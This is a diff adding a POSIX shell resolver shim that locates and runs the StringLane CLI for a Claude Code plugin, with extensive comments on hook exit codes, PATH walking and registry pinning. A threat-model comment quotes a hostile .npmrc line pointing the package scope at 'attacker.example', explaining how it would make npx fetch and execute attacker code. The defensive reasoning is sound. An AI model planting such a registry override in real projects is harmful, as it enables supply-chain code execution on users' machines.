@@ -1,0 +1,235 @@
+#!/bin/sh
+# The resolver shim — STORY-AP-8.
+#
+# `bin/` is on the Bash tool's PATH, so this is what `stringlane ...` finds
+# inside a session with the plugin installed. It vendors nothing and downloads
+# nothing at install time; it only decides which already-present StringLane to
+# run, and gets out of the way.
+#
+# Order, most-specific first:
+#   1. a `stringlane` already on PATH  — a global install, or a dev checkout
+#   2. the project's own node_modules  — a repo that pins its own version
+#   3. `npx -y @stringlane/cli`        — nothing installed, fetch on demand
+#
+# EXITS 0 WHEN ALL THREE ARE EXHAUSTED, and writes nothing to stdout (AC-2).
+# A shim that exits non-zero turns a missing CLI into a BLOCKED EDIT: the hook
+# protocol reads exit 2 from `PreToolUse` as "deny", and a non-zero exit from a
+# command the host cannot find is indistinguishable from a guard that refused.
+# Silence is the honest answer to "StringLane is not installed here".
+#
+# `exec "$@"` passes arguments and environment through untouched, and nothing
+# here echoes either — the environment may hold `OPENAI_API_KEY` (Article IV).
+
+# ---------------------------------------------------------------------------
+# `hook` NEVER exits non-zero, whatever it resolves to.
+#
+# The rule above is about a CLI that is missing. This is about one that is
+# PRESENT and too old, which is the likelier failure and was undefended: the
+# `hook` command shipped in this feature, so any `@stringlane/cli` predating it
+# — a global install, a pinned `node_modules` copy — answers
+# `stringlane hook --host claude-code` with "unknown command: hook" and
+# `EXIT.USAGE`, which is 2, which BLOCKS EVERY `Write`, `Edit`, `MultiEdit` and
+# `NotebookEdit` in the session. That is the exact catastrophe `hook.ts`'s
+# header is written to prevent, and the CLI cannot prevent it from here: the
+# build that would refuse to exit 2 is the build the user does not have.
+#
+# So the shim holds the invariant at the boundary instead. For `hook` only:
+# run rather than `exec`, discard stdout when the exit code is non-zero (a
+# failed command's stdout is not a decision — usage text on stdout would be
+# parsed as one), and exit 0 regardless. stderr passes straight through, so
+# "unknown command: hook" still reaches the transcript where somebody can act
+# on it.
+#
+# Every other command keeps its real exit code: `stringlane check` returning 1
+# for issues is the whole point of that command, and swallowing it would break
+# every script in a CI job.
+# ---------------------------------------------------------------------------
+# Decided from the SCRIPT's own arguments, once, because `dispatch` is also
+# called as `dispatch npx -y @stringlane/cli "$@"` — where its own `$1` is
+# `-y` and reading the subcommand from it would silently skip the guard on the
+# one branch most likely to fail.
+is_hook=no
+if [ "${1:-}" = "hook" ]; then
+  is_hook=yes
+fi
+
+# ---------------------------------------------------------------------------
+# The one invocation that is allowed to SAY SOMETHING when it fails.
+#
+# Everything above is about staying silent, and the two silences compose into a
+# defect: "the guard has nothing to say about this file" and "there is no guard"
+# produce byte-identical output, so a plugin that is installed, enabled and
+# completely inert looks exactly like one that is working. Nothing on the CLI
+# side can close that — the build that would report it is the build that is
+# missing.
+#
+# So the SHIM reports it, on the one event that fires once per session. The
+# registration names it (`--event SessionStart`, see `hook-command.ts`) because
+# the event otherwise lives only in the envelope, on a stdin this script passes
+# through as a file descriptor: buffering a multi-megabyte `PostToolUse` payload
+# into a shell variable to read one field would cost latency on the guarded path
+# and lose every NUL byte in it.
+#
+# A SCAN and not a position, because a position is a second copy of the
+# registration: `--event` is `$4` today only because `--host claude-code`
+# precedes it, so reordering the flags in `hook-command.ts` — which is free and
+# means nothing to `args.ts` — would silently switch this off. The flag is what
+# is registered; where it sits is not.
+#
+# NOT on `PreToolUse`: `systemMessage` is delivered to the MODEL there (docs,
+# fetched 2026-09-07), so a broken install would spend context repeating one
+# sentence on every `Write` of the session.
+# ---------------------------------------------------------------------------
+is_session_start=no
+if [ "$is_hook" = yes ]; then
+  prev=
+  for arg do
+    if [ "$prev" = "--event" ] && [ "$arg" = "SessionStart" ]; then
+      is_session_start=yes
+      break
+    fi
+    prev="$arg"
+  done
+fi
+
+# A `SessionStart` envelope carrying only `systemMessage` — no decision field,
+# because there is no tool call to decide about and a `permissionDecision` of
+# `allow` from a shim that resolved NOTHING would switch off the user's own
+# permission prompts on the strength of a guard that is not running.
+#
+# One line. It is read in a terminal by somebody who has not asked a question.
+warn() {
+  printf '{"systemMessage":"StringLane: %s Run /stringlane:setup."}\n' "$1"
+  exit 0
+}
+
+dispatch() {
+  if [ "$is_hook" != yes ]; then
+    exec "$@"
+  fi
+  # `$(…)` still passes stdin through, which is where the hook envelope arrives.
+  # A non-zero exit here is an UNKNOWN COMMAND OR FLAG — `runHook` returns
+  # `EXIT.OK` on every path it has, which is that file's central invariant — so
+  # it means the CLI that resolved predates this plugin and the guard is dead.
+  out=$("$@") || {
+    if [ "$is_session_start" = yes ]; then
+      warn "the installed CLI is too old for this plugin, so the write guard is not running."
+    fi
+    exit 0
+  }
+  if [ -n "$out" ]; then
+    printf '%s\n' "$out"
+  fi
+  exit 0
+}
+
+# ---------------------------------------------------------------------------
+# Step 1, and why it is a PATH WALK rather than `command -v`.
+#
+# `command -v stringlane` returns the FIRST match on PATH — and the first match
+# is this script, because the plugin's `bin/` is prepended to the session PATH,
+# which is the only reason this script is running at all. So the self-recursion
+# guard it fed (`[ "$found" != "$self" ]`) did not merely protect against a
+# loop: it made step 1 unreachable in the one situation step 1 exists for. A
+# user's own global install of `@stringlane/cli`, sitting further down the same
+# PATH, lost every time to `npx -y @stringlane/cli` two branches below — which
+# pays an npx resolution per tool call when it works, and fails outright while
+# the package is unpublished.
+#
+# Walking PATH and skipping only OUR OWN directory finds it. Directories are
+# compared after `cd -- … && pwd -P`, so the shim reached through a symlinked
+# plugin directory still recognises itself.
+#
+# `-P` is not decoration, and its absence was a hang. Plain `pwd` is LOGICAL: it
+# prints the path as the shell assembled it, symlinks intact. With
+# `/usr/local/sl-bin -> /opt/plugins/stringlane/bin` and both on PATH, the two
+# spellings compared UNEQUAL, so the walk dispatched to the other name — which
+# is this same script, which walks PATH and dispatches back. An infinite `exec`
+# loop, hanging every tool call in the session until the host's hook timeout, in
+# the branch whose own comment claimed to prevent one.
+#
+# Nothing here calls an external command, and that is not style. `dirname` lives
+# on PATH, and the PATHs this script must survive are exactly the ones that do
+# not have it — the plugin's `bin/` holds one file, and a session or a test may
+# hand us a PATH of only that. A failed `dirname` yields an empty `self_dir`,
+# which makes every candidate look like somebody else, and the first of them is
+# this script: an infinite exec loop, in the branch written to prevent one.
+# `cd` and `pwd` are shell builtins; `${0%/*}` needs no process at all.
+# ---------------------------------------------------------------------------
+case "$0" in
+  */*) self_parent="${0%/*}" ;;
+  *) self_parent="." ;;
+esac
+self_dir=$(CDPATH= cd -- "$self_parent" 2>/dev/null && pwd -P)
+
+old_ifs="$IFS"
+IFS=:
+for dir in $PATH; do
+  # `$PATH` was split when this list was expanded, so restoring IFS now is safe
+  # and keeps it out of everything the body calls.
+  IFS="$old_ifs"
+  # A literal empty entry means the current directory, per POSIX.
+  [ -n "$dir" ] || dir=.
+  candidate="$dir/stringlane"
+  # `-f` BEFORE `-x`, because a DIRECTORY named `stringlane` carries the execute
+  # (search) bit and passes `-x` on its own. `dispatch` would then `exec` it,
+  # `exec` would fail with EISDIR, and a non-interactive shell EXITS on a failed
+  # `exec` — so a stray directory anywhere on PATH turned `stringlane check` in
+  # a CI job into exit 126, and the walk never reached the real CLI further down.
+  [ -f "$candidate" ] && [ -x "$candidate" ] || continue
+  # Never us. By resolved directory when both resolve; by raw path otherwise,
+  # because "cannot tell" must not mean "assume it is somebody else".
+  [ "$candidate" = "$0" ] && continue
+  candidate_dir=$(CDPATH= cd -- "$dir" 2>/dev/null && pwd -P)
+  if [ -z "$candidate_dir" ] || [ -z "$self_dir" ] || [ "$candidate_dir" != "$self_dir" ]; then
+    dispatch "$candidate" "$@"
+  fi
+done
+IFS="$old_ifs"
+
+# `-f` for the reason the PATH walk needs it, one line up.
+if [ -n "${CLAUDE_PROJECT_DIR:-}" ] && [ -f "${CLAUDE_PROJECT_DIR}/node_modules/.bin/stringlane" ] &&
+  [ -x "${CLAUDE_PROJECT_DIR}/node_modules/.bin/stringlane" ]; then
+  dispatch "${CLAUDE_PROJECT_DIR}/node_modules/.bin/stringlane" "$@"
+fi
+
+# ---------------------------------------------------------------------------
+# Step 3, and why the registry is PINNED ON THE COMMAND LINE.
+#
+# This branch runs with the session's working directory — the project the user
+# opened, which on a fresh clone is CONTENT WE DID NOT WRITE. npm reads a
+# per-project `.npmrc` from exactly there, and it outranks the user's and the
+# global one. A repository shipping
+#
+#     @stringlane:registry=http://attacker.example/evil/
+#
+# therefore chose where `npx -y @stringlane/cli` fetched from, and `npx -y`
+# EXECUTES what it fetched — arbitrary code, on the first `Write` of the
+# session, with no interaction beyond opening the repository. This is the
+# likeliest branch to run, not a corner: nothing is installed on a fresh clone,
+# so the two steps above both miss.
+#
+# Command-line flags are the highest-precedence npm config source, above the
+# per-project `.npmrc` (npm's own `docs/using-npm/config.md` gives the order:
+# CLI → env → project → user → global). BOTH spellings are needed, and the
+# scoped one is not belt-and-braces: `pickRegistry` in `npm-registry-fetch`
+# consults `@scope:registry` FIRST and only falls back to `registry`, so a
+# project `.npmrc` naming our scope beats a bare `--registry` every time.
+#
+# This does not make a hostile project harmless — it makes it unable to choose
+# where THIS command's package comes from.
+# ---------------------------------------------------------------------------
+if command -v npx >/dev/null 2>&1; then
+  dispatch npx -y \
+    --registry=https://registry.npmjs.org/ \
+    --@stringlane:registry=https://registry.npmjs.org/ \
+    @stringlane/cli "$@"
+fi
+
+# Nothing to run. Let the edit proceed under the user's normal permission rules
+# — but say so ONCE, at session start, rather than leaving an inert plugin
+# indistinguishable from a working one for the whole session.
+if [ "$is_session_start" = yes ]; then
+  warn "no CLI found, so the write guard and the MCP server are not running."
+fi
+exit 0
